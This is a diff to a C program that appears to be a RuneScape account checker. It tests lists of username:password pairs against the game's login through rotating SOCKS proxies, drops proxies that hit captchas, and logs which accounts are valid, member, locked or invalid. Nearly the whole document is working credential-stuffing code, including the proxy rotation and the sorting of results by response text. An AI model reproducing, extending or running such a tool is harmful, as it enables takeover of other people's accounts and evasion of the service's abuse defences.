@@ -6,6 +6,8 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <getopt.h>
+#include <ctype.h>
+#include <signal.h>
 
 
 #include <curl/curl.h>
@@ -15,15 +17,17 @@
 struct accnode {
 	char *username;
 	char *password;
-	bool checked;
-	bool inprogress;
+	volatile bool checked;
+	volatile bool inprogress;
 	struct accnode *next;
 };
 
 struct pxnode {
 	char *proxy;
-	bool dead;
-	bool inprogress;
+	volatile bool dead;
+	volatile bool inprogress;
+	volatile int retries;
+	volatile int type;
 	struct pxnode *next;
 };
 
@@ -35,11 +39,13 @@ struct pxnode *pxhead = NULL;
 pthread_mutex_t account; //Accessing our accnode AND accessing checked_accounts.
 pthread_mutex_t pthnum; //Accessing thread_num AND pxnode AND total_proxies AND dead_proxies.
 
-size_t thread_num = 0; //How many threads are currently running
-size_t checked_accounts = 0; //How many accounts have been checked (if this is the same as the amount as the imported amount, we can exit)
-size_t total_accounts = 0; // How many accounts we have to deal with in total
-size_t total_proxies = 0; //How many proxies we have to deal with in total
-size_t dead_proxies = 0; //How many proxies are 'dead'
+volatile size_t thread_num = 0; //How many threads are currently running
+volatile size_t checked_accounts = 0; //How many accounts have been checked (if this is the same as the amount as the imported amount, we can exit)
+volatile size_t total_accounts = 0; // How many accounts we have to deal with in total
+volatile size_t total_proxies = 0; //How many proxies we have to deal with in total
+volatile size_t dead_proxies = 0; //How many proxies are 'dead'
+
+volatile int keepRunning = 1; //Signal handler int
 
 /*
 	Quick stdup copy, since strdup is nonstandard
@@ -54,10 +60,69 @@ char *strdup(const char *str) {
 	return dup;
 }
 
+bool isAlphaNum(char *str) {
+	char *tmp = str;
+	while (*tmp)
+		if (!(isalnum (*tmp++)))
+			return false;
+    return true;
+}
+
+bool isRSUsername(char *str) {
+	char *tmp = str;
+	while (*tmp)
+		if (*tmp != '_' && *tmp != ' ' && *tmp != '-' && !isalnum(*tmp))
+			return false;
+		else
+			tmp++;
+		
+    return true;
+}
+
 /*
 	Push an account to the end of our account list.
 */
-void push_acc(const char *username, const char *password) {
+void push_acc(char *username, char *password) {
+	//Sanity checks
+	char *p;
+	for (p = username; *p != '\0'; p++)
+		*p = (char)tolower(*p);
+	for (p = password; *p != '\0'; p++)
+		*p = (char)tolower(*p);
+
+	if(!strstr(username, "@") && strlen(username) > 12) {
+		fdo_log(DBGLOG, "Skipping account %s:%s, as the username is longer than 12 character.", username, password);
+		return;
+	}
+	if(!strstr(username, "@") && (!isRSUsername(username) || strstr(username, "fuck") || strstr(username, "shit") || strstr(username, "Mod ") || strstr(username, "Jagex"))) {
+		fdo_log(DBGLOG, "Skipping account %s:%s, as the username containers characters that are not accepted by RS.", username, password);
+		return;
+	}
+	if(*username == ' ' || username[strlen(username)-1] == ' ') {
+		fdo_log(DBGLOG, "Skipping account \"%s\":%s, as the username starts/finishes with a space.", username, password);
+		return;
+	}
+
+	if(strlen(password) > 20 || strlen(password) < 5) {
+		fdo_log(DBGLOG, "Skipping account %s:%s, as the password is longer than 20 characters or shorter than 5.", username, password);
+		return;
+	}
+
+	if(!isAlphaNum(password)) {
+		fdo_log(DBGLOG, "Skipping account %s:%s, as the password is not alphanumeric.", username, password);
+		return;
+	}
+	if(username == password) {
+		fdo_log(DBGLOG, "Skipping account %s, as the username is the same as the password.", username, password);
+		return;
+	}
+	if(strcmp(password, "runescape") == 0 || strcmp(password, "jagex") == 0 || strcmp(password, "password") == 0) {
+		fdo_log(DBGLOG, "Skipping account %s:%s, as the password is unacceptable to RS.", username, password);
+		return;
+	}
+
+	
+
 	struct accnode *current = head;
 
 	pthread_mutex_lock(&account);
@@ -98,7 +163,9 @@ void push_proxy(const char* proxy) {
 	snprintf(current->next->proxy, plen, "%s", proxy);
 
 	current->next->dead = false;
+	current->next->type = 0;
 	current->next->inprogress = false;
+	current->next->retries = 0;
 	current->next->next = NULL;
 	pthread_mutex_unlock(&pthnum);
 
@@ -123,11 +190,11 @@ size_t setupaccounts(void) {
 
 	do_log(GENLOG, "Adding accounts into our list.");
 	while(fgets(accountsetup, 256, O.Accounts)) {
-		if(accountsetup[strlen(accountsetup)-1] == '\n')
+		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == '\n')
 			accountsetup[strlen(accountsetup)-1] = '\0';
-		if(accountsetup[strlen(accountsetup)-1] == '\r')
+		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == '\r')
 			accountsetup[strlen(accountsetup)-1] = '\0';
-		if(accountsetup[strlen(accountsetup)-1] == ' ')
+		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == ' ')
 			accountsetup[strlen(accountsetup)-1] = '\0';
 		username = strtok(accountsetup, ":");
 		if(!username) continue;
@@ -157,13 +224,13 @@ size_t setupproxies(void) {
 
 	do_log(GENLOG, "Adding proxies into our list.");
 	while(fgets(proxysetup, 32, O.Proxies)) {
-		if(proxysetup[strlen(proxysetup)-1] == '\n')
+		if(*proxysetup && proxysetup[strlen(proxysetup)-1] == '\n')
 			proxysetup[strlen(proxysetup)-1] = '\0';
-		if(proxysetup[strlen(proxysetup)-1] == '\r')
+		if(*proxysetup && proxysetup[strlen(proxysetup)-1] == '\r')
 			proxysetup[strlen(proxysetup)-1] = '\0';
-		if(proxysetup[strlen(proxysetup)-1] == ' ')
+		if(*proxysetup && proxysetup[strlen(proxysetup)-1] == ' ')
 			proxysetup[strlen(proxysetup)-1] = '\0';
-		if(!proxysetup) continue;
+		if(strlen(proxysetup) < 11 || strlen(proxysetup) > 21 || !proxysetup) continue;
 		push_proxy(proxysetup);
 		i++;
 	}
@@ -178,7 +245,7 @@ size_t setupproxies(void) {
 	It is multithreaded, and doesn't take any arguments.
 */
 void *do_threaded() {
-	char out[300000]; //Max response we will handle. TODO: Determine appropriate amount
+	char out[100000]; //Max response we will handle.
 
 	struct accnode *current = head;
 
@@ -189,7 +256,7 @@ void *do_threaded() {
 	pthread_mutex_lock(&account);
 	while(current) {
 		if(current->inprogress || current->checked) {
-//			fdo_log(GENLOG, "account: progress: %d checked?: %d", current->inprogress, current->checked);
+//			fdo_log(DBGLOG, "account: progress: %d checked?: %d", current->inprogress, current->checked);
 			current = current->next;
 			continue;
 		}
@@ -204,7 +271,7 @@ void *do_threaded() {
 	struct pxnode *currentpx = pxhead;
 	pthread_mutex_lock(&pthnum);
 	while(currentpx) {
-		if(currentpx->inprogress || currentpx->dead) {
+		if(currentpx->inprogress || currentpx->dead || currentpx->retries == O.retries) {
 			currentpx = currentpx->next;
 			continue;
 		}
@@ -228,30 +295,46 @@ void *do_threaded() {
 		if(current)
 			current->inprogress = false;
 		pthread_mutex_unlock(&account);
+		pthread_exit(NULL);
 		return NULL;
 	}
 
+	pthread_mutex_lock(&pthnum);
+	int stype = (currentpx->retries % 2) ? CURLPROXY_SOCKS5 : CURLPROXY_SOCKS4;
+	int rstype = currentpx->type;
+	pthread_mutex_unlock(&pthnum);
 
-	CURLcode resp = check(out, 300000, username, password, proxy);
+	CURLcode resp = check(out, 300000, username, password, proxy, ((rstype == 0) ? stype : rstype));
 
 	if(resp != CURLE_OK) {
-
 		pthread_mutex_lock(&pthnum);
-		currentpx->dead = true;
-		free(currentpx->proxy);
-		dead_proxies++;
+		currentpx->retries++;
+		if(O.retries == currentpx->retries) {
+			currentpx->dead = true;
+			fdo_log(DBGLOG, "Proxy is now defined as dead.(%s)", currentpx->proxy);
+			free(currentpx->proxy);
+			currentpx->proxy = NULL;
+			dead_proxies++;
+		}
 		pthread_mutex_unlock(&pthnum);
 
-		//check() handles the GENLOG for the case of resp != CURLE_OK.
+		//check() handles the DBGLOG for the case of resp != CURLE_OK.
 	} else if(strstr(out, "Change Password")) {
 		fdo_log( (strstr(out, "Currently Not a Member") ? VALIDLOG : VALIDLOGMB), "%s:%s (proxy: %s)", username, password, proxy);
-
+		printf("%zu\n", strlen(out));
 		pthread_mutex_lock(&account);
 		current->checked = true;
 		checked_accounts++;
-		free(current->username);
-		free(current->password);
+		free(current->username); current->username = NULL;
+		free(current->password); current->password = NULL;
 		pthread_mutex_unlock(&account);
+
+		pthread_mutex_lock(&pthnum);
+		if(currentpx->retries > 0) {
+			currentpx->type = (rstype == 0) ? stype : rstype;
+			currentpx->retries--;
+		}
+		pthread_mutex_unlock(&pthnum);
 
 	} else if(strstr(out, "Your Account is Locked")) {
 		fdo_log(LOCKEDLOG, "%s:%s (proxy: %s)", username, password, proxy);
@@ -259,9 +342,16 @@ void *do_threaded() {
 		pthread_mutex_lock(&account);
 		current->checked = true;
 		checked_accounts++;
-		free(current->username);
-		free(current->password);
+		free(current->username); current->username = NULL;
+		free(current->password); current->password = NULL;
 		pthread_mutex_unlock(&account);
+
+		pthread_mutex_lock(&pthnum);
+		if(currentpx->retries > 0) {
+			currentpx->type = (rstype == 0) ? stype : rstype;
+			currentpx->retries--;
+		}
+		pthread_mutex_unlock(&pthnum);
 
 	} else if(strstr(out, "email or password you entered was incorrect")) {
 		fdo_log(INVALIDLOG, "%s:%s (proxy: %s)", username, password, proxy);
@@ -269,25 +359,36 @@ void *do_threaded() {
 		pthread_mutex_lock(&account);
 		current->checked = true;
 		checked_accounts++;
-		free(current->username);
-		free(current->password);
+		free(current->username); current->username = NULL;
+		free(current->password); current->password = NULL;
 		pthread_mutex_unlock(&account);
 
+		pthread_mutex_lock(&pthnum);
+		if(currentpx->retries > 0) {
+			currentpx->type = (rstype == 0) ? stype : rstype;
+			currentpx->retries--;
+		}
+		pthread_mutex_unlock(&pthnum);
+
 	} else if(strstr(out, "Download sound as MP3")) {
-		fdo_log(GENLOG, "Captcha detected with the proxy %s. Adding account %s:%s back into list.", proxy, username, password);
+		fdo_log(DBGLOG, "Captcha detected with the proxy %s.", proxy, username, password);
 
 		pthread_mutex_lock(&pthnum);
-		free(currentpx->proxy);
+		free(currentpx->proxy); currentpx->proxy = NULL;
 		currentpx->dead = true;
 		dead_proxies++;
 		pthread_mutex_unlock(&pthnum);
 	} else {
-		fdo_log(GENLOG, "Something strange has happened(Please report this). Going to continue. Debug info: resp: %d, strerr: %s, login: %s:%s, proxy: %s.", resp, curl_easy_strerror(resp), username, password, proxy);
+		fdo_log(DBGLOG, "Something strange has happened(Please report this). Going to continue. Debug info: resp: %d, strerr: %s, login: %s:%s, proxy: %s.", resp, curl_easy_strerror(resp), username, password, proxy);
 
 		pthread_mutex_lock(&pthnum);
-		free(currentpx->proxy);
-		currentpx->dead = true;
-		dead_proxies++;
+		currentpx->retries++;
+		if(O.retries == currentpx->retries) {
+			currentpx->dead = true;
+			fdo_log(DBGLOG, "Proxy %s is now defined as dead.", currentpx->proxy);
+			free(currentpx->proxy); currentpx->proxy = NULL;
+			dead_proxies++;
+		}
 		pthread_mutex_unlock(&pthnum);
 	}
 
@@ -305,6 +406,7 @@ void *do_threaded() {
 	free(username);
 	free(proxy);
 
+	pthread_exit(NULL);
 	return NULL;
 
 }
@@ -315,11 +417,33 @@ void *do_threaded() {
 */
 void usage(const char *p) {
 
-	fprintf(stderr, "usage: \n"
-			"%s -t <numthreads> -o <outfile_base> -a <accountfile> -p <proxyfile> [-sv]\n\n\n", p);
+	fprintf(stderr, "(C) 2015-2015 Joshua Rogers <honey@internot.info>\n"
+			"Contact: @MegaManSec on Twitter.\n"
+			"See COPYING for information regarding distribution.\n"
+			"See README for information about the program and its abilities.\n\n\n");
 
-	fprintf(stderr, "example: \n"
-			"%s -t 10 -o outfile -a accounts.txt -p proxies.txt\n", p);
+	fprintf(stderr, "Usage: \n"
+			"%s -t <numthreads> -o <outfile_base> -a <accountfile> -p <proxyfile> [-shvr]\n\n", p);
+
+	fprintf(stderr, "Example: \n"
+			"%s -t 10 -o outfile -a accounts.txt -p proxies.txt -r 8\n\n\n", p);
+
+	fprintf(stderr, "Options:\n"
+			"   -t, Required: The number of threads to running concurrently.\n"
+			"       This must not exceed proxies or accounts. Minimum 1.\n"
+			"   -o, Optional: The basename for where we will output results.\n"
+			"       If the file does not exist, it will be created if possible.\n"
+			"       If the outfile includes a directory, the directory MUST exist.\n"
+			"   -s, Optional: Output logs to stdout, with no colors or extra information. -s takes priority over -v, however\n"
+			"       -s may used with -o.\n"
+			"       \033[31;01mIf -s OR -o is not set, the only output is colored output which goes to stderr.\033[0m\n"
+			"   -a, Required: The file with our username:password list in it. Must be readable.\n"
+			"   -p, Required: The file with our proxy:port list in it. Must be readable.\n"
+			"   -h, Optional: This help page.\n"
+			"   -v, Optional: Verbose mode; shows debugging information.\n"
+			"   -r, Required: Proxy tries; How many times to try a proxy before it is\n"
+			"       classified as 'dead' - Minimum 4! (this number is effectively half, due to proxytype switching)\n");
+			
 
 	exit(0);
 }
@@ -331,7 +455,10 @@ void usage(const char *p) {
 
 bool CheckOpen(void) {
 	do_log(GENLOG, "Checking files.");
-	if(!O.Valid || !O.ValidMb || !O.Invalid || !O.Locked || !O.Accounts || !O.Proxies)
+	if(O.basename)
+		if(!O.Valid || !O.ValidMb || !O.Invalid || !O.Locked)
+			return false;
+	if(!O.Accounts || !O.Proxies)
 		return false;
 
 	return true;
@@ -368,42 +495,46 @@ void HandleStartFile(char *accountfile, char *proxyfile) {
 
 	do_log(GENLOG, "Beginning file opening.");
 
-	size_t plen;
-	plen = snprintf(NULL, 0, "%s_valid.txt", O.basename);
-	plen += 1;
-	char *working = malloc(plen);
-	snprintf(working, plen, "%s_valid.txt", O.basename);
+	if(O.basename) {
+		size_t plen;
+		plen = snprintf(NULL, 0, "%s_valid.txt", O.basename);
+		plen += 1;
+		char *working = malloc(plen);
+		snprintf(working, plen, "%s_valid.txt", O.basename);
 
-	plen = snprintf(NULL, 0, "%s_members_valid.txt", O.basename);
-	plen += 1;
-	char *members = malloc(plen);
-	snprintf(members, plen, "%s_members_valid.txt", O.basename);
+		plen = snprintf(NULL, 0, "%s_members_valid.txt", O.basename);
+		plen += 1;
+		char *members = malloc(plen);
+		snprintf(members, plen, "%s_members_valid.txt", O.basename);
 
-	plen = snprintf(NULL, 0, "%s_invalid.txt", O.basename);
-	plen += 1;
-	char *invalid = malloc(plen);
-	snprintf(invalid, plen, "%s_invalid.txt", O.basename);
+		plen = snprintf(NULL, 0, "%s_invalid.txt", O.basename);
+		plen += 1;
+		char *invalid = malloc(plen);
+		snprintf(invalid, plen, "%s_invalid.txt", O.basename);
 
-	plen = snprintf(NULL, 0, "%s_locked.txt", O.basename);
-	plen += 1;
-	char *locked = malloc(plen);
-	snprintf(locked, plen, "%s_locked.txt", O.basename);
+		plen = snprintf(NULL, 0, "%s_locked.txt", O.basename);
+		plen += 1;
+		char *locked = malloc(plen);
+		snprintf(locked, plen, "%s_locked.txt", O.basename);
 
-	O.Valid = fopen(working, "a");
-	O.ValidMb = fopen(members, "a");
-	O.Invalid = fopen(invalid, "a");
-	O.Locked = fopen(locked, "a");
+		O.Valid = fopen(working, "a+");
+		O.ValidMb = fopen(members, "a+");
+		O.Invalid = fopen(invalid, "a+");
+		O.Locked = fopen(locked, "a+");
+
+		free(working);
+		free(members);
+		free(invalid);
+		free(locked);
+		free(O.basename);
+
+	}
 
 	O.Accounts = fopen(accountfile, "r");
 	O.Proxies = fopen(proxyfile, "r");
 
-	free(working);
-	free(members);
-	free(invalid);
-	free(locked);
 	free(accountfile);
 	free(proxyfile);
-	free(O.basename);
 
 }
 
@@ -471,7 +602,9 @@ void StartHead(void) {
 	pxhead = malloc(sizeof *pxhead);
 	pxhead->proxy = NULL;
 	pxhead->dead = true;
+	pxhead->type = 0;
 	pxhead->inprogress = false;
+	pxhead->retries = O.retries;
 	pxhead->next = NULL;
 }
 
@@ -506,15 +639,36 @@ bool acctocheck(void) {
 	return false;
 }
 
+/*
+	Check whether there is an account to process.
+	Not threadsafe, and doesn't need to be, since it will be rerun anyways.
+*/
+bool proxytouse(void) {
+	struct pxnode *tmp = pxhead;
+
+	while(tmp) {
+		if(tmp->inprogress == false && tmp->dead == false && tmp->retries != O.retries)
+			return true;
+
+		tmp = tmp->next;
+	}
+	return false;
+}
+
+void intHandler(int n) {
+    keepRunning = 0;
+}
+
 int main(int argc, char *argv[]) {
 
 	//Initialize options.
+	signal(SIGINT, intHandler);
 
 	char *accountfile = NULL;
 	char *proxyfile = NULL;
 
 	int opt;
-	while((opt = getopt(argc, argv, "t:o:a:p:hs")) != -1) {
+	while((opt = getopt(argc, argv, "t:o:a:p:r:hvs")) != -1) {
 		switch(opt) {
 		case 't':
 			O.threads = (size_t)strtol(optarg, NULL, 10);
@@ -531,6 +685,12 @@ int main(int argc, char *argv[]) {
 		case 's':
 			O.std = true;
 			break;
+		case 'v':
+			O.verbose = true;
+			break;
+		case 'r':
+			O.retries = strtol(optarg, NULL, 10);
+			break;
 		case 'h':
 		case '?':
 		default:
@@ -538,16 +698,14 @@ int main(int argc, char *argv[]) {
 		}
 	}
 
-	if(O.threads <= 0 || !O.basename || !accountfile || !proxyfile) {
+	if(O.threads <= 0 || !accountfile || !proxyfile || 3 >= O.retries) {
 		free(O.basename);
 		free(accountfile);
 		free(proxyfile);
 		usage(argv[0]);
 	}
 
-
 	HandleStartFile(accountfile, proxyfile);
-
 	if(!CheckOpen()) {
 		CloseFiles();
 		fdo_log(GENLOG, "Could not open all files. See %s -h for help.", argv[0]);
@@ -584,30 +742,35 @@ int main(int argc, char *argv[]) {
 	}
 
 	size_t ithd = 0;
-	pthread_t *thread = NULL;
+
 	fdo_log(GENLOG, "Starting with %zu accounts!", total_accounts);
-	while(checked_accounts != total_accounts && total_proxies != dead_proxies) {
+	while(checked_accounts != total_accounts && total_proxies != dead_proxies && keepRunning) {
+		sleep(1);
 		pthread_mutex_lock(&pthnum);
-		int chk = thread_num;
+		size_t chk = thread_num;
 		pthread_mutex_unlock(&pthnum);
-		if(chk = O.threads || !acctocheck()) {
+		if(chk == O.threads || !acctocheck() || !proxytouse()) {
 			continue;
 		}
 		pthread_mutex_lock(&pthnum);
 		thread_num++;
 		pthread_mutex_unlock(&pthnum);
 		//let do_threaded() decide whether or not we can pull an account(processing all already?)
-		thread = realloc(thread, (sizeof *thread) * (ithd+1));
-		pthread_create(&thread[ithd], NULL, &do_threaded, NULL);
+		pthread_t thread;
+		int perr = pthread_create(&thread, NULL, &do_threaded, NULL);			
+		if(perr != 0)
+			printf("pthread_create error(Please report this): %s\n", strerror(perr));
+		pthread_detach(thread);
 		ithd++;
 
 	}
 
-	do_log(GENLOG, "Finished: Waiting for final threads to finish.");
+	//Just to double check...
+	freeListContents();
+	if(checked_accounts == total_accounts)
+		do_log(GENLOG, "Finished!");
+	if(total_proxies == dead_proxies)
+		do_log(GENLOG, "Ran out of proxies! Exiting.");
 
-
-	free(thread);
-
-	do_log(GENLOG, "Finished. Have a good day.");
 	end(0);
 }
